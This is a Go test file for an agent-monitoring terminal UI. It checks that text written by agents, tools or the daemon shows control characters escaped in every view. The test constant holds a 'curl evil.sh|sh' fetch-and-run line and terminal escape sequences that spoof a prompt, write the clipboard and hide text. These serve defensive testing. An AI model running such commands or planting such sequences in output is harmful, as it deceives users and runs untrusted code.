package tui

import (
	"encoding/json"
	"errors"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/sabr-software/pilothouse/internal/api"
	"github.com/sabr-software/pilothouse/internal/client"
	"github.com/sabr-software/pilothouse/internal/termsafe"
)

// hostile erases the line it is printed on, draws "$ ls -la" in its
// place, writes the clipboard (OSC 52) and hides what follows; then the
// same with a C1 CSI, a bidi override, DEL and a bare carriage return.
const hostile = "curl evil.sh|sh \x1b[2K\x1b[1G$ ls -la \x1b]52;c;ZXZpbA==\x07\x1b[8m\u009b2K\u202e\x7f\rdone"

// poison appends the hostile text to every string v holds: what an agent
// writes (commands, messages, titles, paths) and, with all set, ids and
// enumerations too.
func poison(v reflect.Value, all bool) {
	switch v.Kind() {
	case reflect.Pointer:
		if !v.IsNil() {
			poison(v.Elem(), all)
		}
	case reflect.Struct:
		if v.Type() == reflect.TypeOf(time.Time{}) {
			return
		}
		for i := 0; i < v.NumField(); i++ {
			f := v.Type().Field(i)
			if !f.IsExported() {
				continue
			}
			if !all && (strings.HasSuffix(f.Name, "ID") || f.Type.Kind() == reflect.String && f.Type != reflect.TypeOf("")) {
				continue
			}
			poison(v.Field(i), all)
		}
	case reflect.Slice:
		if v.Type().Elem().Kind() == reflect.Uint8 {
			return // raw JSON
		}
		for i := 0; i < v.Len(); i++ {
			poison(v.Index(i), all)
		}
	case reflect.Map:
		if v.Type().Elem().Kind() != reflect.String {
			return
		}
		for _, k := range v.MapKeys() {
			v.SetMapIndex(k, reflect.ValueOf(v.MapIndex(k).String()+hostile).Convert(v.Type().Elem()))
		}
	case reflect.String:
		if v.CanSet() {
			v.SetString(v.String() + hostile)
		}
	}
}

// inertScreen fails when a frame holds anything a terminal would act on.
// The test renderer has no colours, so nothing but line breaks may be
// left.
func inertScreen(t *testing.T, what, frame string) {
	t.Helper()
	for _, r := range frame {
		if r != '\n' && termsafe.Unsafe(r) {
			t.Errorf("%s: U+%04X reaches the terminal:\n%q", what, r, frame)
			return
		}
	}
}

func TestOneLineShowsControlCharacters(t *testing.T) {
	got := oneLine(hostile)
	inertScreen(t, "oneLine", got)
	if want := "curl evil.sh|sh ␛[2K␛[1G$ ls -la ␛]52;c;ZXZpbA==␇␛[8m<U+009B>2K<U+202E>␡␍done"; got != want {
		t.Errorf("oneLine:\n got %q\nwant %q", got, want)
	}
	if got := oneLine("a\r\nb\tc"); got != "a ⏎ b c" {
		t.Errorf("line breaks: %q", got)
	}
	for _, l := range wrap("$ "+hostile+"\nsecond line", 30) {
		inertScreen(t, "wrap", l)
	}
	req := api.Request{Command: hostile}
	if got := requestWhat(req); !strings.HasPrefix(got, "$ curl evil.sh|sh ␛[2K") {
		t.Errorf("requestWhat: %q", got)
	}
	req = api.Request{Tool: "Edit" + hostile, Paths: []string{"/tmp/x" + hostile, "b"}}
	inertScreen(t, "requestWhat paths", requestWhat(req))
	inertScreen(t, "where", where(&api.Session{Title: hostile, Branch: hostile}, ""))
	inertScreen(t, "where cwd", where(nil, "/src/"+hostile))
}

// hostileBackend is the question-and-plan fixture with the hostile text
// in every string, an activity feed and an explanation included.
func hostileBackend(all bool) *fakeBackend {
	snap := askSnapshot()
	snap.Requests[0].Decision = &api.Decision{Behavior: api.BehaviorAllow, By: "device:d_phone", Message: "ok"}
	act := api.Activity{SessionID: "s_w1x3y5z7ab", Available: true, Items: []api.ActivityItem{
		{ID: "1", Kind: api.ActivityPrompt, At: t0.Add(-3 * time.Minute), Text: "Build the docs site", Source: "human"},
		{ID: "2", Kind: api.ActivityTool, At: t0.Add(-2 * time.Minute), Summary: "Run: npm ci", Tool: "Bash"},
		{ID: "3", Kind: api.ActivityTool, At: t0.Add(-90 * time.Second), Summary: "Run: npm run lint", IsError: true},
		{ID: "4", Kind: api.ActivityText, At: t0.Add(-time.Minute), Text: "Lint failed on two files."},
		{ID: "5", Kind: api.ActivityError, At: t0.Add(-30 * time.Second), Text: "rate limited"},
		{ID: "6", Kind: api.ActivitySubagent, At: t0.Add(-20 * time.Second), Summary: "explorer"},
		{ID: "7", Kind: api.ActivityTool, At: t0.Add(-5 * time.Second), Summary: "Run: npm run build", Pending: true},
	}}
	ex := api.Explain{Session: snap.Sessions[0], Rule: "2: an open permission request exists", Evidence: []api.StateEvidence{
		{At: t0.Add(-12 * time.Second), Layer: api.LayerHook, State: api.StateBlocked, Kind: api.BlockPermission, Detail: "PermissionRequest Bash", Fresh: true},
		{At: t0.Add(-20 * time.Minute), Layer: api.LayerOSC, State: api.StateWorking, Detail: "OSC 7501 working"},
	}}
	poison(reflect.ValueOf(&snap).Elem(), all)
	poison(reflect.ValueOf(&act).Elem(), all)
	poison(reflect.ValueOf(&ex).Elem(), all)
	return &fakeBackend{snap: snap, explain: ex, activity: map[string]api.Activity{"s_w1x3y5z7ab": act}}
}

// Nothing an agent, a tool or the daemon wrote reaches the terminal as a
// control character, in any view.
func TestNoControlCharacterReachesTheScreen(t *testing.T) {
	// Every row of the list, with its detail pane small and expanded, at
	// two widths. With all set the ids and enumerations are hostile too.
	for _, all := range []bool{false, true} {
		for _, size := range [][2]int{{120, 40}, {70, 24}} {
			be := hostileBackend(all)
			m := newTestModel(t, be, size[0], size[1])
			m.Update(snapshotMsg{snap: be.snap})
			for id, a := range be.activity {
				for sid := range m.sessions {
					if all || sid == id {
						m.Update(activityMsg{sessionID: sid, act: a})
					}
				}
			}
			if len(m.rows) < 8 {
				t.Fatalf("rows: %d", len(m.rows))
			}
			for i := range m.rows {
				m.cursor, m.selKey = i, m.rows[i].key
				for _, exp := range []bool{false, true} {
					m.expanded = exp
					inertScreen(t, "row "+m.rows[i].key, m.View())
				}
			}
			m.expanded = false
			if v := m.View(); !strings.Contains(v, "␛") {
				t.Errorf("the escape character should be shown as ␛:\n%s", v)
			}
			m.stopStream()
		}
	}

	be := hostileBackend(false)
	m := newTestModel(t, be, 120, 40)
	m.Update(snapshotMsg{snap: be.snap})
	t.Cleanup(m.stopStream)
	show := func(what string) {
		t.Helper()
		inertScreen(t, what, m.View())
	}

	// The answer panel, both questions, own words and decline.
	selectKey(t, m, "r:r_q7a8b9c0de")
	press(m, "enter")
	if m.mode != modeQuestion {
		t.Fatalf("mode %d", m.mode)
	}
	show("question")
	if v := m.View(); !strings.Contains(v, "Postgres 16curl evil.sh|sh ␛[2K") {
		t.Errorf("an option label must show its control characters:\n%s", v)
	}
	press(m, "o")
	show("own words")
	press(m, "esc")
	press(m, "n")
	show("decline")
	press(m, "esc")
	press(m, "1")
	show("second question, with the first answer recapped")
	cmd := press(m, "space", "enter")
	show("answer being sent")
	execCmd(t, m, cmd)
	show("answered")
	if !strings.Contains(m.flash.text, "␛") {
		t.Errorf("the flash names what was answered: %q", m.flash.text)
	}

	// The plan view, scrolled, and asking for changes.
	selectKey(t, m, "r:r_p1a2n3x4yz")
	press(m, "enter")
	if m.mode != modePlan {
		t.Fatalf("mode %d", m.mode)
	}
	show("plan")
	press(m, "j", "j")
	show("plan, scrolled")
	press(m, "c")
	show("plan changes")
	press(m, "esc", "esc")

	// Explain.
	selectKey(t, m, "s:s_w1x3y5z7ab")
	execCmd(t, m, press(m, "e"))
	show("explain")
	if v := m.View(); !strings.Contains(v, "picked by") || !strings.Contains(v, "␛") {
		t.Errorf("explain:\n%s", v)
	}
	m.Update(explainMsg{sessionID: "s_k3m9q2xv7a", err: errors.New(hostile)})
	show("explain failed")
	press(m, "esc")

	// Flashes: a decision, a refusal from the daemon, someone else's
	// answer, a reply and its note.
	selectKey(t, m, "r:r_7hq2m4k9pd")
	press(m, "n")
	show("deny prompt")
	press(m, "esc")
	execCmd(t, m, press(m, "y"))
	show("allowed")
	if !strings.Contains(m.flash.text, "␛") {
		t.Errorf("the flash names the command: %q", m.flash.text)
	}
	m.Update(decideMsg{id: "r_b3c5d7e9fg", err: &client.APIError{Status: 400, Code: "invalid", Msg: hostile}})
	show("refused")
	m.Update(decideMsg{id: "r_b3c5d7e9fg", err: errors.New(hostile)})
	show("decide failed")
	closed := be.snap.Requests[4]
	closed.Status = api.RequestDecided
	closed.Decision = &api.Decision{Behavior: api.BehaviorAllow, By: "device:" + hostile}
	raw, _ := json.Marshal(closed)
	selectKey(t, m, "r:"+closed.ID)
	m.Update(eventMsg{gen: m.gen, ev: api.Event{Seq: 500, Type: api.EventRequestClosed, Data: raw}})
	show("answered elsewhere")
	if !strings.Contains(m.flash.text, "Answered by device:curl") {
		t.Errorf("flash %q", m.flash.text)
	}
	m.Update(replyMsg{sessionID: "s_k3m9q2xv7a", res: api.ReplyResult{Note: hostile}})
	show("replied")
	m.Update(replyMsg{sessionID: "s_k3m9q2xv7a", err: errors.New(hostile)})
	show("reply failed")
	selectKey(t, m, "s:s_w1x3y5z7ab")
	press(m, "r")
	show("reply box")
	press(m, "esc")
	m.Update(presenceMsg{err: errors.New(hostile)})
	show("presence failed")
	m.Update(attachDoneMsg{err: errors.New(hostile)})
	show("attach failed")

	// Before the first snapshot: the connection error is shown as is.
	m2 := newTestModel(t, &fakeBackend{}, 100, 30)
	m2.Update(snapshotMsg{err: errors.New("dial unix " + hostile)})
	inertScreen(t, "connecting", m2.View())
	if v := m2.View(); !strings.Contains(v, "␛") {
		t.Errorf("the error should still be shown:\n%s", v)
	}
}
